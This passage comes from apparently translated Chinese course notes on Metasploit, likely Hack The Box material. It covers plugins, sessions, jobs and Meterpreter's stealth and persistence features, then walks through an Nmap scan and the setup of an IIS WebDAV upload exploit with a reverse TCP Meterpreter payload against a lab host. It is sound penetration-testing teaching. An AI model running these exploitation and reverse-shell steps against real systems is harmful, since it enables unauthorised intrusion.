class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfconsole -q</span><br><span class="line"></span><br><span class="line">msf6 &gt; load pentest</span><br><span class="line"></span><br><span class="line">       ___         _          _     ___ _           _</span><br><span class="line">      | _ \___ _ _| |_ ___ __| |_  | _ \ |_  _ __ _(_)_ _</span><br><span class="line">      |  _/ -_) &#x27; \  _/ -_|_-&lt;  _| |  _/ | || / _` | | &#x27; \ </span><br><span class="line">      |_| \___|_||_\__\___/__/\__| |_| |_|\_,_\__, |_|_||_|</span><br><span class="line">                                              |___/</span><br><span class="line">      </span><br><span class="line">Version 1.6</span><br><span class="line">Pentest Plugin loaded.</span><br><span class="line">by Carlos Perez (carlos_perez[at]darkoperator.com)</span><br><span class="line">[*] Successfully loaded plugin: pentest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; help</span><br><span class="line"></span><br><span class="line">Tradecraft Commands</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">    Command          Description</span><br><span class="line">    -------          -----------</span><br><span class="line">    check_footprint  Checks the possible footprint of a post module on a target system.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">auto_exploit Commands</span><br><span class="line">=====================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    show_client_side  Show matched client side exploits from data imported from vuln scanners.</span><br><span class="line">    vuln_exploit      Runs exploits based on data imported from vuln scanners.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Discovery Commands</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">    Command                 Description</span><br><span class="line">    -------                 -----------</span><br><span class="line">    discover_db             Run discovery modules against current hosts in the database.</span><br><span class="line">    network_discover        Performs a port-scan and enumeration of services found for non pivot networks.</span><br><span class="line">    pivot_network_discover  Performs enumeration of networks available to a specified Meterpreter session.</span><br><span class="line">    show_session_networks   Enumerate the networks one could pivot thru Meterpreter in the active sessions.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Project Commands</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    project       Command for managing projects.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Postauto Commands</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Command             Description</span><br><span class="line">    -------             -----------</span><br><span class="line">    app_creds           Run application password collection modules against specified sessions.</span><br><span class="line">    get_lhost           List local IP addresses that can be used for LHOST.</span><br><span class="line">    multi_cmd           Run shell command against several sessions</span><br><span class="line">    multi_meter_cmd     Run a Meterpreter Console Command against specified sessions.</span><br><span class="line">    multi_meter_cmd_rc  Run resource file with Meterpreter Console Commands against specified sessions.</span><br><span class="line">    multi_post          Run a post module against specified sessions.</span><br><span class="line">    multi_post_rc       Run resource file with post modules and options against specified sessions.</span><br><span class="line">    sys_creds           Run system password collection modules against specified sessions.</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>许多人为 Metasploit 框架编写了许多不同的插件。它们都有特定的目的，在熟悉它们之后可以极大地帮助我们节省时间。查看下面的流行插件列表：</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td><a href="https://nmap.org/">nMap（预装）</a></td><td><a href="https://sectools.org/tool/nexpose/">NexPose（预装）</a></td><td><a href="https://www.tenable.com/products/nessus">Nessus（预装）</a></td></tr><tr><td><a href="http://blog.gentilkiwi.com/mimikatz">Mimikatz（预装 V.1）</a></td><td><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Extensions/Stdapi/Stdapi">Stdapi（预装）</a></td><td><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation">电磁炮</a></td></tr><tr><td><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/extensions/priv/priv.rb">私人</a></td><td><a href="https://www.offensive-security.com/metasploit-unleashed/fun-incognito/">隐身（预装）</a></td><td><a href="https://github.com/darkoperator/Metasploit-Plugins">黑暗操作员的</a></td></tr></tbody></table><h3 id="混入"><a href="#混入" class="headerlink" title="混入"></a>混入</h3><p>Metasploit 框架是用面向对象的编程语言 Ruby 编写的。<code>msfconsole</code>这在使用起来非常出色方面起着重要作用。Mixin 是其中一种特性，在实现时，它可以为脚本的创建者和用户提供很大的灵活性。</p><p>Mixin 是充当其他类使用的方法的类，而不必是其他类的父类。因此，将其称为继承而不是包含被认为是不合适的。它们主要用于我们：</p><ol><li>想为一个类提供很多可选的功能。</li><li>想要为多个类使用一个特定的功能。</li></ol><p>大多数 Ruby 编程语言都围绕作为模块的 Mixins 展开。Mixins 的概念是使用 word 实现的<code>include</code>，我们将模块名称作为<code>parameter</code>. <a href="https://en.wikibooks.org/wiki/Metasploit/UsingMixins">我们可以在这里</a>阅读更多关于 mixin 的信息。</p><p>如果我们刚刚开始使用 Metasploit，我们不应该担心 Mixins 的使用或它们对我们评估的影响。然而，这里提到它们是为了说明 Metasploit 的定制会变得多么复杂。</p><h2 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h2><p>MSFconsole 可以同时管理多个模块。这是它为用户提供如此多灵活性的众多原因之一。这是通过使用 来完成的<code>Sessions</code>，它为您部署的所有模块创建专用的控制接口。</p><p>一旦创建了多个会话，我们就可以在它们之间切换并将不同的模块链接到其中一个后台会话以在其上运行或将它们转换为作业。请注意，一旦将会话置于后台，它将继续运行，并且我们与目标主机的连接将持续存在。但是，如果在有效负载运行时出现问题，会话可能会终止，从而导致通信通道中断。</p><h2 id="使用会话"><a href="#使用会话" class="headerlink" title="使用会话"></a>使用会话</h2><p>在 msfconsole 中运行任何可用的漏洞利用或辅助模块时，只要它们形成与目标主机的通信通道，我们就可以将会话置于后台。这可以通过按组合键或在 Meterpreter stages 的情况下<code>[CTRL] + [Z]</code>键入命令来完成。<code>background</code>这将提示我们一条确认消息。接受提示后，我们将返回到 msfconsole 提示符 ( <code>msf6 &gt;</code>) 并立即能够启动不同的模块。</p><h4 id="列出活动会话"><a href="#列出活动会话" class="headerlink" title="列出活动会话"></a>列出活动会话</h4><p>我们可以使用该<code>sessions</code>命令来查看我们当前活动的会话。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec_psh) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -&gt; 10.10.10.205:50501 (10.10.10.205)</span><br></pre></td></tr></table></figure><h4 id="与会话交互"><a href="#与会话交互" class="headerlink" title="与会话交互"></a>与会话交互</h4><p>您可以使用该<code>sessions -i [no.]</code>命令打开特定会话。</p><p> 与会话交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/psexec_psh) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p>当我们想在一个已经被利用的系统上运行一个额外的模块时，这特别有用，该系统具有形成的、稳定的通信通道。</p><p>这可以通过后台处理我们当前的会话来完成，该会话是由于第一个漏洞利用的成功而形成的，搜索我们希望运行的第二个模块，并且，如果所选模块的类型可能，选择会话号该模块应该运行。这可以从第二个模块的菜单中完成<code>show options</code>。</p><p>通常，这些模块可以在类别中找到<code>post</code>，指的是 Post-Exploitation 模块。此类别中的主要模块原型包括凭据收集器、本地漏洞利用建议器和内部网络扫描器。</p><hr><h2 id="工作"><a href="#工作" class="headerlink" title="工作"></a>工作</h2><p>例如，如果我们在特定端口下运行主动攻击并且需要此端口用于不同的模块，我们不能简单地使用终止会话<code>[CTRL] + [C]</code>。如果我们这样做，我们会看到该端口仍在使用中，影响我们对新模块的使用。因此，我们需要使用<code>jobs</code>命令来查看当前在后台运行的活动任务并终止旧任务以释放端口。</p><p>会话中的其他类型的任务也可以转换为作业以在后台无缝运行，即使会话终止或消失也是如此。</p><h4 id="查看作业命令帮助菜单"><a href="#查看作业命令帮助菜单" class="headerlink" title="查看作业命令帮助菜单"></a>查看作业命令帮助菜单</h4><p>我们可以通过键入 来查看此命令的帮助菜单，就像其他命令一样<code>jobs -h</code>。</p><p> 查看作业命令帮助菜单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; jobs -h</span><br><span class="line">Usage: jobs [options]</span><br><span class="line"></span><br><span class="line">Active job manipulation and interaction.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -K        Terminate all running jobs.</span><br><span class="line">    -P        Persist all running jobs on restart.</span><br><span class="line">    -S &lt;opt&gt;  Row search filter.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -i &lt;opt&gt;  Lists detailed information about a running job.</span><br><span class="line">    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.</span><br><span class="line">    -l        List all running jobs.</span><br><span class="line">    -p &lt;opt&gt;  Add persistence to job by job ID</span><br><span class="line">    -v        Print more detailed info.  Use with -i and -l</span><br></pre></td></tr></table></figure><h4 id="查看漏洞利用命令帮助菜单"><a href="#查看漏洞利用命令帮助菜单" class="headerlink" title="查看漏洞利用命令帮助菜单"></a>查看漏洞利用命令帮助菜单</h4><p>当我们运行 exploit 时，我们可以通过键入<code>exploit -j</code>. 根据命令的帮助菜单<code>exploit</code>，添加<code>-j</code>到我们的命令中。而不仅仅是<code>exploit</code>or <code>run</code>，将“在作业的上下文中运行它”。</p><p> 查看漏洞利用命令帮助菜单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit -h</span><br><span class="line">Usage: exploit [options]</span><br><span class="line"></span><br><span class="line">Launches an exploitation attempt.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -J        Force running in the foreground, even if passive.</span><br><span class="line">    -e &lt;opt&gt;  The payload encoder to use.  If none is specified, ENCODER is used.</span><br><span class="line">    -f        Force the exploit to run regardless of the value of MinimumRank.</span><br><span class="line">    -h        Help banner.</span><br><span class="line">    -j        Run in the context of a job.</span><br><span class="line"></span><br><span class="line">&lt;SNIP</span><br></pre></td></tr></table></figure><h4 id="将漏洞作为后台作业运行"><a href="#将漏洞作为后台作业运行" class="headerlink" title="将漏洞作为后台作业运行"></a>将漏洞作为后台作业运行</h4><p> 将漏洞作为后台作业运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.34:4444</span><br></pre></td></tr></table></figure><h4 id="列出正在运行的作业"><a href="#列出正在运行的作业" class="headerlink" title="列出正在运行的作业"></a>列出正在运行的作业</h4><p>要列出所有正在运行的作业，我们可以使用<code>jobs -l</code>命令。要杀死特定的工作，请查看索引号。作业并使用<code>kill [index no.]</code>命令。使用该<code>jobs -K</code>命令终止所有正在运行的作业。</p><p> 列出正在运行的作业</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; jobs -l</span><br><span class="line"></span><br><span class="line">Jobs</span><br><span class="line">====</span><br><span class="line"></span><br><span class="line"> Id  Name                    Payload                    Payload opts</span><br><span class="line"> --  ----                    -------                    ------------</span><br><span class="line"> 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444</span><br></pre></td></tr></table></figure><p>接下来，我们将使用极其强大的<code>Meterpreter</code>有效负载。</p><h1 id="计价器"><a href="#计价器" class="headerlink" title="计价器"></a>计价器</h1><hr><p>Payload<code>Meterpreter</code>是一种特定类型的多方面、可扩展的 Payload，用于<code>DLL injection</code>确保与受害主机的连接稳定且难以使用简单检查进行检测，并且可以配置为在重启或系统更改时保持不变。此外，Meterpreter 完全驻留在远程主机的内存中，不会在硬盘上留下任何痕迹，因此很难用传统的取证技术进行检测。</p><p>它被称为渗透测试的瑞士军刀，这是有充分理由的。Meterpreter 的目的是专门改进我们的后开发程序，为我们提供一组精心挑选的相关工具，以便从内部更直接地枚举目标主机。它可以帮助我们找到各种特权升级技术、AV 规避技术、进一步的漏洞研究、提供持久访问、枢轴等。</p><p>对于一些有趣的阅读，请查看这篇关于Meterpreter 无阶段有效载荷的<a href="https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/">文章和这篇关于修改 Metasploit 模板以进行规避的</a><a href="https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion">文章</a>。这些主题超出了本模块的范围，但我们应该意识到这些可能性。</p><hr><h2 id="运行-Meterpreter"><a href="#运行-Meterpreter" class="headerlink" title="运行 Meterpreter"></a>运行 Meterpreter</h2><p>要运行 Meterpreter，我们只需要从输出中选择它的任何版本<code>show payloads</code>，同时考虑到我们正在攻击的连接类型和操作系统。</p><p>漏洞利用完成后，会发生以下事件：</p><ul><li>目标执行初始阶段。这通常是 bind、reverse、findtag、passivex 等。</li><li>stager 加载以 Reflective 为前缀的 DLL。反射存根处理 DLL 的加载&#x2F;注入。</li><li>Meterpreter 核心初始化，通过套接字建立 AES 加密链接，并发送 GET。Metasploit 收到此 GET 并配置客户端。</li><li>最后，Meterpreter 加载扩展。如果模块授予管理权限，它将始终加载<code>stdapi</code>和加载。<code>priv</code>所有这些扩展都是通过 AES 加密加载的。</li></ul><p>每当 Meterpreter Payload 被发送并在目标系统上运行时，我们都会收到一个<code>Meterpreter shell</code>. 然后我们可以立即发出<code>help</code>命令来查看 Meterpreter shell 的功能。</p><h4 id="MSF-Meterpreter-命令-1"><a href="#MSF-Meterpreter-命令-1" class="headerlink" title="MSF - Meterpreter 命令"></a>MSF - Meterpreter 命令</h4><p> MSF - Meterpreter 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate                   Migrate the server to another process</span><br><span class="line">    pivot                     Manage pivot listeners</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, then re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br></pre></td></tr></table></figure><p>其中一些命令也可在模块备忘单中找到以供参考。</p><p>我们需要了解 Meterpreter 的主要思想是，它与在目标操作系统上获得直接 shell 一样好，但具有更多功能。Meterpreter 的开发人员为该项目设定了明确的设计目标，以期在未来的可用性上飙升。Meterpreter 需要：</p><ul><li>隐身</li><li>强大的</li><li>可扩展</li></ul><hr><h2 id="隐身"><a href="#隐身" class="headerlink" title="隐身"></a>隐身</h2><p>Meterpreter 在启动并到达目标后，完全驻留在内存中，不会向磁盘写入任何内容。当 Meterpreter 将自己注入到受感染的进程中时，也不会创建新进程。此外，它可以执行从一个正在运行的进程到另一个运行进程的进程迁移。</p><p>使用现在更新的 msfconsole-v6，目标主机和我们之间的所有 Meterpreter 有效负载通信都使用 AES 加密，以确保数据通信的机密性和完整性。</p><p>所有这些都提供了有限的取证证据，而且对受害机器的影响也很小。</p><hr><h2 id="强大的"><a href="#强大的" class="headerlink" title="强大的"></a>强大的</h2><p>Meterpreter 在目标主机和攻击者之间使用通道化通信系统证明非常有用。当我们通过为它打开一个专用通道立即在我们的 Meterpreter 阶段内生成一个主机操作系统 shell 时，我们可以直接注意到这一点。这也允许使用 AES 加密流量。</p><hr><h2 id="可扩展"><a href="#可扩展" class="headerlink" title="可扩展"></a>可扩展</h2><p>Meterpreter 的功能可以在运行时不断增强并通过网络加载。其模块化结构还允许在不重建的情况下添加新功能。</p><hr><h2 id="使用-Meterpreter"><a href="#使用-Meterpreter" class="headerlink" title="使用 Meterpreter"></a>使用 Meterpreter</h2><p>我们已经在有效载荷部分深入研究了 Meterpreter 的基础知识。现在，我们将了解 Meterpreter shell 的真正优势，以及它如何提高评估的有效性并在交战期间节省时间。我们首先对已知目标运行基本扫描。我们将按单点方式执行此操作，从 msfconsole 内部执行所有操作，以便从对我们目标的数据跟踪中获益。</p><h4 id="MSF-扫描目标"><a href="#MSF-扫描目标" class="headerlink" title="MSF - 扫描目标"></a>MSF - 扫描目标</h4><p> MSF - 扫描目标</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_nmap -sV -p- -T5 -A 10.10.10.15</span><br><span class="line"></span><br><span class="line">[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC</span><br><span class="line">[*] Nmap: Nmap scan report for 10.10.10.15</span><br><span class="line">[*] Nmap: Host is up (0.021s latency).</span><br><span class="line">[*] Nmap: Not shown: 65534 filtered ports</span><br><span class="line">[*] Nmap: PORT   STATE SERVICE VERSION</span><br><span class="line">[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0</span><br><span class="line">[*] Nmap: | http-methods:</span><br><span class="line">[*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT</span><br><span class="line">[*] Nmap: |_http-server-header: Microsoft-IIS/6.0</span><br><span class="line">[*] Nmap: |_http-title: Under Construction</span><br><span class="line">[*] Nmap: | http-webdav-scan:</span><br><span class="line">[*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span><br><span class="line">[*] Nmap: |   WebDAV type: Unknown</span><br><span class="line">[*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK</span><br><span class="line">[*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT</span><br><span class="line">[*] Nmap: |_  Server Type: Microsoft-IIS/6.0</span><br><span class="line">[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------      ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line">10.10.10.15             Unknown                    device         </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; services</span><br><span class="line"></span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host         port  proto  name  state  info</span><br><span class="line">----         ----  -----  ----  -----  ----</span><br><span class="line">10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0</span><br></pre></td></tr></table></figure><p>接下来，我们查找有关此框上运行的服务的一些信息。具体来说，我们想要探索端口 80 以及那里托管了哪种 Web 服务。</p><p>我们注意到这是一个正在建设中的网站——在这里看不到任何与网络相关的内容。但是，仔细查看网页的末尾和 Nmap 扫描的结果，我们注意到服务器正在运行<code>Microsoft IIS httpd 6.0</code>。因此，我们朝着这个方向进一步研究，寻找此版本 IIS 的常见漏洞。经过一番搜索，我们找到了以下标记表示一个广泛存在的漏洞：<code>CVE-2017-7269</code>. 它还具有为其开发的 Metasploit 模块。</p><h4 id="MSF-寻找漏洞"><a href="#MSF-寻找漏洞" class="headerlink" title="MSF - 寻找漏洞"></a>MSF - 寻找漏洞</h4><p> MSF - 寻找漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search iis_webdav_upload_asp</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                       Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                       ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 &gt; use 0</span><br><span class="line"></span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/iis/iis_webdav_upload_asp):</span><br><span class="line"></span><br><span class="line">   Name          Current Setting        Required  Description</span><br><span class="line">   ----          ---------------        --------  -----------</span><br><span class="line">   HttpPassword                         no        The HTTP password to specify for authentication</span><br><span class="line">   HttpUsername                         no        The HTTP username to specify for authentication</span><br><span class="line">   METHOD        move                   yes       Move or copy the file on the remote system from .txt -&gt; .asp (Accepted: move, copy)</span><br><span class="line">   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload</span><br><span class="line">   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT         80                     yes       The target port (TCP)</span><br><span class="line">   SSL           false                  no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   VHOST                                no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.239.181   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>我们继续设置所需的参数。目前，这些将是<code>LHOST</code>并且<code>RHOST</code>目标上的所有其他内容似乎都在运行默认配置。</p><h4 id="MSF-配置漏洞利用和有效载荷"><a href="#MSF-配置漏洞利用和有效载荷" class="headerlink" title="MSF - 配置漏洞利用和有效载荷"></a>MSF - 配置漏洞利用和有效载荷</h4><p> MSF - 配置漏洞利用和有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; set RHOST 10.10.10.15</span><br><span class="line"></span><br><span class="line">RHOST =&gt; 